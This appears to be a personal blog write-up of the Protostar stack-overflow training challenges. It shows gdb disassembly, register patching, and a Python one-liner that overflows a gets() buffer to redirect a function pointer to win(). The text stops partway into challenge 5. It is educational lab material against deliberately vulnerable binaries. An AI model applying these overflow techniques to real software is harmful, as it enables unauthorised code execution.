<!DOCTYPE html>
<html lang=en>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
    <meta name="description" content="Protostar stack challenge Writeup it’s pretty old but gold  Challenge 1123$ ./stack0 TEST Try again?  debug  123456789101112131415161718192021(gdb) disas main Dump of assembler code for function main:">
<meta name="keywords" content="exploitation">
<meta property="og:type" content="article">
<meta property="og:title" content="Protostar Stack Writeup">
<meta property="og:url" content="http://yoursite.com/2018/08/27/Protostar-Stack-Writeup/index.html">
<meta property="og:site_name" content="kth&#39;s lab">
<meta property="og:description" content="Protostar stack challenge Writeup it’s pretty old but gold  Challenge 1123$ ./stack0 TEST Try again?  debug  123456789101112131415161718192021(gdb) disas main Dump of assembler code for function main:">
<meta property="og:locale" content="en">
<meta property="og:updated_time" content="2018-09-27T15:45:17.940Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="Protostar Stack Writeup">
<meta name="twitter:description" content="Protostar stack challenge Writeup it’s pretty old but gold  Challenge 1123$ ./stack0 TEST Try again?  debug  123456789101112131415161718192021(gdb) disas main Dump of assembler code for function main:">
    
    
        
          
              <link rel="shortcut icon" href="/images/favicon.ico">
          
        
        
          
            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
          
        
        
          
            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
          
        
    
    <!-- title -->
    <title>Protostar Stack Writeup</title>
    <!-- styles -->
    <link rel="stylesheet" href="/css/style.css">
    <!-- persian styles -->
    
      <link rel="stylesheet" href="/css/rtl.css">
    
    <!-- rss -->
    
    
</head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/archives/">AllIHave</a></li>
        
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" href="/2018/09/27/Lol-Bins/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" href="/2018/07/28/Empire-Redirector/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://yoursite.com/2018/08/27/Protostar-Stack-Writeup/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://twitter.com/share?url=http://yoursite.com/2018/08/27/Protostar-Stack-Writeup/&text=Protostar Stack Writeup"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://yoursite.com/2018/08/27/Protostar-Stack-Writeup/&title=Protostar Stack Writeup"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://yoursite.com/2018/08/27/Protostar-Stack-Writeup/&is_video=false&description=Protostar Stack Writeup"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=Protostar Stack Writeup&body=Check out this article: http://yoursite.com/2018/08/27/Protostar-Stack-Writeup/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://getpocket.com/save?url=http://yoursite.com/2018/08/27/Protostar-Stack-Writeup/&title=Protostar Stack Writeup"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://reddit.com/submit?url=http://yoursite.com/2018/08/27/Protostar-Stack-Writeup/&title=Protostar Stack Writeup"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://yoursite.com/2018/08/27/Protostar-Stack-Writeup/&title=Protostar Stack Writeup"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://digg.com/submit?url=http://yoursite.com/2018/08/27/Protostar-Stack-Writeup/&title=Protostar Stack Writeup"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://yoursite.com/2018/08/27/Protostar-Stack-Writeup/&name=Protostar Stack Writeup&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
</ul>

    </div>
    <div id="toc">
      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Protostar-stack-challenge-Writeup"><span class="toc-number">1.</span> <span class="toc-text">Protostar stack challenge Writeup</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Challenge-1"><span class="toc-number">1.1.</span> <span class="toc-text">Challenge 1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Challenge-2"><span class="toc-number">1.2.</span> <span class="toc-text">Challenge 2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Challenge-3"><span class="toc-number">1.3.</span> <span class="toc-text">Challenge 3</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#challenge-4"><span class="toc-number">1.4.</span> <span class="toc-text">challenge 4</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#challenge-5"><span class="toc-number">1.5.</span> <span class="toc-text">challenge 5</span></a></li></ol></li></ol>
    </div>
  </span>
</div>

    
    <div class="content index my4">
        
        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle" itemprop="name headline">
        Protostar Stack Writeup
    </h1>



    <div class="meta">
      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span itemprop="name">kth's lab</span>
      </span>
      
    <div class="postdate">
        <time datetime="2018-08-27T10:08:36.000Z" itemprop="datePublished">2018-08-27</time>
    </div>


      
    <div class="article-tag">
        <i class="fas fa-tag"></i>
        <a class="tag-link" href="/tags/exploitation/">exploitation</a>
    </div>


    </div>
  </header>
  

  <div class="content" itemprop="articleBody">
    <h2 id="Protostar-stack-challenge-Writeup"><a href="#Protostar-stack-challenge-Writeup" class="headerlink" title="Protostar stack challenge Writeup"></a>Protostar stack challenge Writeup</h2><ul>
<li>it’s pretty old but gold</li>
</ul>
<h3 id="Challenge-1"><a href="#Challenge-1" class="headerlink" title="Challenge 1"></a>Challenge 1</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ ./stack0 </span><br><span class="line">TEST </span><br><span class="line">Try again?</span><br></pre></td></tr></table></figure>
<ul>
<li>debug</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">(gdb) disas main </span><br><span class="line">Dump of assembler code for function main:</span><br><span class="line">0x080483f4 &lt;main+0&gt;:    push   %ebp</span><br><span class="line">0x080483f5 &lt;main+1&gt;:    mov    %esp,%ebp </span><br><span class="line">0x080483f7 &lt;main+3&gt;:    and    $0xfffffff0,%esp </span><br><span class="line">0x080483fa &lt;main+6&gt;:    sub    $0x60,%esp </span><br><span class="line">0x080483fd &lt;main+9&gt;:    movl   $0x0,0x5c(%esp) </span><br><span class="line">0x08048405 &lt;main+17&gt;:   lea    0x1c(%esp),%eax </span><br><span class="line">0x08048409 &lt;main+21&gt;:   mov    %eax,(%esp) </span><br><span class="line">0x0804840c &lt;main+24&gt;:   call   0x804830c &lt;gets@plt&gt; </span><br><span class="line">0x08048411 &lt;main+29&gt;:   mov    0x5c(%esp),%eax  </span><br><span class="line">0x08048415 &lt;main+33&gt;:   test   %eax,%eax </span><br><span class="line">0x08048417 &lt;main+35&gt;:   je     0x8048427 &lt;main+51&gt; </span><br><span class="line">0x08048419 &lt;main+37&gt;:   movl   $0x8048500,(%esp) </span><br><span class="line">0x08048420 &lt;main+44&gt;:   call   0x804832c &lt;puts@plt&gt; </span><br><span class="line">0x08048425 &lt;main+49&gt;:   jmp    0x8048433 &lt;main+63&gt; </span><br><span class="line">0x08048427 &lt;main+51&gt;:   movl   $0x8048529,(%esp)  </span><br><span class="line">0x0804842e &lt;main+58&gt;:   call   0x804832c &lt;puts@plt&gt; </span><br><span class="line">0x08048433 &lt;main+63&gt;:   leave </span><br><span class="line">0x08048434 &lt;main+64&gt;:   ret </span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure>
<ul>
<li>compare eax in 0x08048415</li>
<li>bypass je instruction by changing eax value</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">(gdb) info reg</span><br><span class="line">eax            0x0      0</span><br><span class="line">ecx            0xbffffc6c       -1073742740</span><br><span class="line">edx            0xb7fd9334       -1208118476</span><br><span class="line">ebx            0xb7fd7ff4       -1208123404</span><br><span class="line">esp            0xbffffc50       0xbffffc50</span><br><span class="line">ebp            0xbffffcb8       0xbffffcb8</span><br><span class="line">esi            0x0      0</span><br><span class="line">edi            0x0      0</span><br><span class="line">eip            0x8048417        0x8048417 &lt;main+35&gt;</span><br><span class="line">eflags         0x200246 [ PF ZF IF ID ]</span><br><span class="line">cs             0x73     115</span><br><span class="line">ss             0x7b     123</span><br><span class="line">ds             0x7b     123</span><br><span class="line">es             0x7b     123</span><br><span class="line">fs             0x0      0</span><br><span class="line">gs             0x33     51</span><br><span class="line">(gdb) b *0x08048415</span><br><span class="line">(gdb) set $eax = 1</span><br><span class="line">(gdb) c</span><br><span class="line">Continuing.</span><br><span class="line">you have changed the &apos;modified&apos; variable</span><br><span class="line"></span><br><span class="line">Program exited with code 051</span><br></pre></td></tr></table></figure>
<h3 id="Challenge-2"><a href="#Challenge-2" class="headerlink" title="Challenge 2"></a>Challenge 2</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">(gdb) disas main</span><br><span class="line">Dump of assembler code for function main:</span><br><span class="line">0x08048464 &lt;main+0&gt;:    push   %ebp</span><br><span class="line">0x08048465 &lt;main+1&gt;:    mov    %esp,%ebp</span><br><span class="line">0x08048467 &lt;main+3&gt;:    and    $0xfffffff0,%esp</span><br><span class="line">0x0804846a &lt;main+6&gt;:    sub    $0x60,%esp</span><br><span class="line">0x0804846d &lt;main+9&gt;:    cmpl   $0x1,0x8(%ebp)</span><br><span class="line">0x08048471 &lt;main+13&gt;:   jne    0x8048487 &lt;main+35&gt;</span><br><span class="line">0x08048473 &lt;main+15&gt;:   movl   $0x80485a0,0x4(%esp)</span><br><span class="line">0x0804847b &lt;main+23&gt;:   movl   $0x1,(%esp)</span><br><span class="line">0x08048482 &lt;main+30&gt;:   call   0x8048388 &lt;errx@plt&gt;</span><br><span class="line">0x08048487 &lt;main+35&gt;:   movl   $0x0,0x5c(%esp)</span><br><span class="line">0x0804848f &lt;main+43&gt;:   mov    0xc(%ebp),%eax</span><br><span class="line">0x08048492 &lt;main+46&gt;:   add    $0x4,%eax</span><br><span class="line">0x08048495 &lt;main+49&gt;:   mov    (%eax),%eax</span><br><span class="line">0x08048497 &lt;main+51&gt;:   mov    %eax,0x4(%esp)</span><br><span class="line">0x0804849b &lt;main+55&gt;:   lea    0x1c(%esp),%eax</span><br><span class="line">0x0804849f &lt;main+59&gt;:   mov    %eax,(%esp)</span><br><span class="line">0x080484a2 &lt;main+62&gt;:   call   0x8048368 &lt;strcpy@plt&gt;</span><br><span class="line">0x080484a7 &lt;main+67&gt;:   mov    0x5c(%esp),%eax</span><br><span class="line">0x080484ab &lt;main+71&gt;:   cmp    $0x61626364,%eax</span><br><span class="line">0x080484b0 &lt;main+76&gt;:   jne    0x80484c0 &lt;main+92&gt;</span><br><span class="line">0x080484b2 &lt;main+78&gt;:   movl   $0x80485bc,(%esp)</span><br><span class="line">0x080484b9 &lt;main+85&gt;:   call   0x8048398 &lt;puts@plt&gt;</span><br><span class="line">0x080484be &lt;main+90&gt;:   jmp    0x80484d5 &lt;main+113&gt;</span><br><span class="line">0x080484c0 &lt;main+92&gt;:   mov    0x5c(%esp),%edx</span><br><span class="line">0x080484c4 &lt;main+96&gt;:   mov    $0x80485f3,%eax</span><br><span class="line">0x080484c9 &lt;main+101&gt;:  mov    %edx,0x4(%esp)</span><br><span class="line">0x080484cd &lt;main+105&gt;:  mov    %eax,(%esp)</span><br><span class="line">0x080484d0 &lt;main+108&gt;:  call   0x8048378 &lt;printf@plt&gt;</span><br><span class="line">0x080484d5 &lt;main+113&gt;:  leave</span><br><span class="line">0x080484d6 &lt;main+114&gt;:  ret</span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure>
<ul>
<li>program compare eax with value 0x61626364 at 0x080484ab</li>
<li>change eax with the value</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">(gdb) set $eax = 0x61626364</span><br><span class="line">(gdb) info reg</span><br><span class="line">eax            0x61626364       1633837924</span><br><span class="line">ecx            0x0      0</span><br><span class="line">edx            0x9      9</span><br><span class="line">ebx            0xb7fd7ff4       -1208123404</span><br><span class="line">esp            0xbffffc50       0xbffffc50</span><br><span class="line">ebp            0xbffffcb8       0xbffffcb8</span><br><span class="line">esi            0x0      0</span><br><span class="line">edi            0x0      0</span><br><span class="line">eip            0x80484ab        0x80484ab &lt;main+71&gt;</span><br><span class="line">eflags         0x200246 [ PF ZF IF ID ]</span><br><span class="line">cs             0x73     115</span><br><span class="line">ss             0x7b     123</span><br><span class="line">ds             0x7b     123</span><br><span class="line">es             0x7b     123</span><br><span class="line">fs             0x0      0</span><br><span class="line">gs             0x33     51</span><br><span class="line">(gdb) c</span><br><span class="line">Continuing.</span><br><span class="line">you have correctly got the variable to the right value</span><br><span class="line"></span><br><span class="line">Program exited with code 067.</span><br></pre></td></tr></table></figure>
<h3 id="Challenge-3"><a href="#Challenge-3" class="headerlink" title="Challenge 3"></a>Challenge 3</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">(gdb) disas main</span><br><span class="line">Dump of assembler code for function main:</span><br><span class="line">0x08048494 &lt;main+0&gt;:    push   %ebp</span><br><span class="line">0x08048495 &lt;main+1&gt;:    mov    %esp,%ebp</span><br><span class="line">0x08048497 &lt;main+3&gt;:    and    $0xfffffff0,%esp</span><br><span class="line">0x0804849a &lt;main+6&gt;:    sub    $0x60,%esp</span><br><span class="line">0x0804849d &lt;main+9&gt;:    movl   $0x80485e0,(%esp)</span><br><span class="line">0x080484a4 &lt;main+16&gt;:   call   0x804837c &lt;getenv@plt&gt;</span><br><span class="line">0x080484a9 &lt;main+21&gt;:   mov    %eax,0x5c(%esp)</span><br><span class="line">0x080484ad &lt;main+25&gt;:   cmpl   $0x0,0x5c(%esp)</span><br><span class="line">0x080484b2 &lt;main+30&gt;:   jne    0x80484c8 &lt;main+52&gt;</span><br><span class="line">0x080484b4 &lt;main+32&gt;:   movl   $0x80485e8,0x4(%esp)</span><br><span class="line">0x080484bc &lt;main+40&gt;:   movl   $0x1,(%esp)</span><br><span class="line">0x080484c3 &lt;main+47&gt;:   call   0x80483bc &lt;errx@plt&gt;</span><br><span class="line">0x080484c8 &lt;main+52&gt;:   movl   $0x0,0x58(%esp)</span><br><span class="line">0x080484d0 &lt;main+60&gt;:   mov    0x5c(%esp),%eax</span><br><span class="line">0x080484d4 &lt;main+64&gt;:   mov    %eax,0x4(%esp)</span><br><span class="line">0x080484d8 &lt;main+68&gt;:   lea    0x18(%esp),%eax</span><br><span class="line">0x080484dc &lt;main+72&gt;:   mov    %eax,(%esp)</span><br><span class="line">0x080484df &lt;main+75&gt;:   call   0x804839c &lt;strcpy@plt&gt;</span><br><span class="line">0x080484e4 &lt;main+80&gt;:   mov    0x58(%esp),%eax</span><br><span class="line">0x080484e8 &lt;main+84&gt;:   cmp    $0xd0a0d0a,%eax</span><br><span class="line">0x080484ed &lt;main+89&gt;:   jne    0x80484fd &lt;main+105&gt;</span><br><span class="line">0x080484ef &lt;main+91&gt;:   movl   $0x8048618,(%esp)</span><br><span class="line">0x080484f6 &lt;main+98&gt;:   call   0x80483cc &lt;puts@plt&gt;</span><br><span class="line">0x080484fb &lt;main+103&gt;:  jmp    0x8048512 &lt;main+126&gt;</span><br><span class="line">0x080484fd &lt;main+105&gt;:  mov    0x58(%esp),%edx</span><br><span class="line">0x08048501 &lt;main+109&gt;:  mov    $0x8048641,%eax</span><br><span class="line">0x08048506 &lt;main+114&gt;:  mov    %edx,0x4(%esp)</span><br><span class="line">0x0804850a &lt;main+118&gt;:  mov    %eax,(%esp)</span><br><span class="line">0x0804850d &lt;main+121&gt;:  call   0x80483ac &lt;printf@plt&gt;</span><br><span class="line">0x08048512 &lt;main+126&gt;:  leave</span><br><span class="line">0x08048513 &lt;main+127&gt;:  ret</span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure>
<ul>
<li>same as above compare eax with value 0xd0a0d0a</li>
<li>change eax</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">(gdb) c</span><br><span class="line">Continuing.</span><br><span class="line">you have correctly modified the variable</span><br><span class="line"></span><br><span class="line">Program exited with code 051.</span><br></pre></td></tr></table></figure>
<h3 id="challenge-4"><a href="#challenge-4" class="headerlink" title="challenge 4"></a>challenge 4</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">(gdb) disas main</span><br><span class="line">Dump of assembler code for function main:</span><br><span class="line">0x08048438 &lt;main+0&gt;:    push   %ebp</span><br><span class="line">0x08048439 &lt;main+1&gt;:    mov    %esp,%ebp</span><br><span class="line">0x0804843b &lt;main+3&gt;:    and    $0xfffffff0,%esp</span><br><span class="line">0x0804843e &lt;main+6&gt;:    sub    $0x60,%esp</span><br><span class="line">0x08048441 &lt;main+9&gt;:    movl   $0x0,0x5c(%esp)</span><br><span class="line">0x08048449 &lt;main+17&gt;:   lea    0x1c(%esp),%eax</span><br><span class="line">0x0804844d &lt;main+21&gt;:   mov    %eax,(%esp)</span><br><span class="line">0x08048450 &lt;main+24&gt;:   call   0x8048330 &lt;gets@plt&gt;</span><br><span class="line">0x08048455 &lt;main+29&gt;:   cmpl   $0x0,0x5c(%esp)</span><br><span class="line">0x0804845a &lt;main+34&gt;:   je     0x8048477 &lt;main+63&gt;</span><br><span class="line">0x0804845c &lt;main+36&gt;:   mov    $0x8048560,%eax</span><br><span class="line">0x08048461 &lt;main+41&gt;:   mov    0x5c(%esp),%edx</span><br><span class="line">0x08048465 &lt;main+45&gt;:   mov    %edx,0x4(%esp)</span><br><span class="line">0x08048469 &lt;main+49&gt;:   mov    %eax,(%esp)</span><br><span class="line">0x0804846c &lt;main+52&gt;:   call   0x8048350 &lt;printf@plt&gt;</span><br><span class="line">0x08048471 &lt;main+57&gt;:   mov    0x5c(%esp),%eax</span><br><span class="line">0x08048475 &lt;main+61&gt;:   call   *%eax</span><br><span class="line">0x08048477 &lt;main+63&gt;:   leave</span><br><span class="line">0x08048478 &lt;main+64&gt;:   ret</span><br></pre></td></tr></table></figure>
<ul>
<li>at 0x08048455 , stack pointer of 0x5c (92) is compare with 0</li>
<li>if equal jump to 0x8048477</li>
<li>let’s see</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">(gdb) b *0x08048455</span><br><span class="line">Breakpoint 1 at 0x8048455: file stack3/stack3.c, line 20.</span><br><span class="line">(gdb) r</span><br><span class="line">Starting program: /opt/protostar/bin/stack3</span><br><span class="line">AAAABBBB</span><br><span class="line">Breakpoint 1, main (argc=1, argv=0xbffffd54) at stack3/stack3.c:20</span><br><span class="line">20      stack3/stack3.c: No such file or directory.</span><br><span class="line">        in stack3/stack3.c</span><br><span class="line">(gdb) x/30x $esp+92</span><br><span class="line">0xbffffc9c:     0x00000000      0x08048490      0x00000000      0xbffffd28</span><br><span class="line">0xbffffcac:     0xb7eadc76      0x00000001      0xbffffd54      0xbffffd5c</span><br><span class="line">0xbffffcbc:     0xb7fe1848      0xbffffd10      0xffffffff      0xb7ffeff4</span><br><span class="line">0xbffffccc:     0x08048266      0x00000001      0xbffffd10      0xb7ff0626</span><br><span class="line">0xbffffcdc:     0xb7fffab0      0xb7fe1b28      0xb7fd7ff4      0x00000000</span><br><span class="line">0xbffffcec:     0x00000000      0xbffffd28      0x271138e0      0x0d502ef0</span><br><span class="line">0xbffffcfc:     0x00000000      0x00000000      0x00000000      0x00000001</span><br><span class="line">0xbffffd0c:     0x08048370      0x00000000</span><br></pre></td></tr></table></figure>
<ul>
<li>so 0xbffffc9c ( esp +92) is equal to 0</li>
<li>it will jump to 0x8048477 which is exit</li>
<li>have to modified esp +92</li>
<li>calculate the stack size</li>
<li>our input located in esp+28</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">(gdb) x/30x $esp+28</span><br><span class="line">0xbffffc5c:     0x41414141      0x42424242      0x08049600      0xbffffc78</span><br><span class="line">0xbffffc6c:     0x0804830c      0xb7ff1040      0x0804967c      0xbffffca8</span><br><span class="line">0xbffffc7c:     0x080484a9      0xb7fd8304      0xb7fd7ff4      0x08048490</span><br><span class="line">0xbffffc8c:     0xbffffca8      0xb7ec6365      0xb7ff1040      0x0804849b</span><br><span class="line">0xbffffc9c:     0x00000000      0x08048490      0x00000000      0xbffffd28</span><br><span class="line">0xbffffcac:     0xb7eadc76      0x00000001      0xbffffd54      0xbffffd5c</span><br><span class="line">0xbffffcbc:     0xb7fe1848      0xbffffd10      0xffffffff      0xb7ffeff4</span><br><span class="line">0xbffffccc:     0x08048266      0x00000001</span><br></pre></td></tr></table></figure>
<ul>
<li>substract 0xbffffc5c (esp+24) from 0xbffffc9c (esp+92)</li>
<li>size is 68 ebp is 4 bytes</li>
<li>so stack size is 64</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ python -c &apos;print &quot;A&quot;*64 + &quot;BBBB&quot; &apos; | ./stack3</span><br><span class="line">calling function pointer, jumping to 0x42424242</span><br><span class="line">Segmentation fault</span><br></pre></td></tr></table></figure>
<ul>
<li>so we have to jump to some function, in source code there is win function</li>
<li>let’s find location of win function and redirect to it</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ objdump -d stack3 |grep win</span><br><span class="line">08048424 &lt;win&gt;:</span><br><span class="line"></span><br><span class="line">$ python -c &apos;print &quot;A&quot;*64 + &quot;\x24\x84\x04\x08&quot; &apos; | ./stack3</span><br><span class="line">calling function pointer, jumping to 0x08048424</span><br><span class="line">code flow successfully changed</span><br></pre></td></tr></table></figure>
<h3 id="challenge-5"><a href="#challenge-5" class="headerlink" title="challenge 5"></a>challenge 5</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Dump of assembler code for function main:</span><br><span class="line">0x08048408 &lt;main+0&gt;:    push   %ebp</span><br><span class="line">0x08048409 &lt;main+1&gt;:    mov    %esp,%ebp</span><br><span class="line">0x0804840b &lt;main+3&gt;:    and    $0xfffffff0,%esp</span><br><span class="line">0x0804840e &lt;main+6&gt;:    sub    $0x50,%esp</span><br><span class="line">0x08048411 &lt;main+9&gt;:    lea    0x10(%esp),%eax</span><br><span class="line">0x08048415 &lt;main+13&gt;:   mov    %eax,(%esp)</span><br><span class="line">0x08048418 &lt;main+16&gt;:   call   0x804830c &lt;gets@plt&gt;</span><br><span class="line">0x0804841d &lt;main+21&gt;:   leave</span><br><span class="line">0x0804841e &lt;main+22&gt;:   ret</span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure>
<ul>
<li><p>calculate buffer</p>
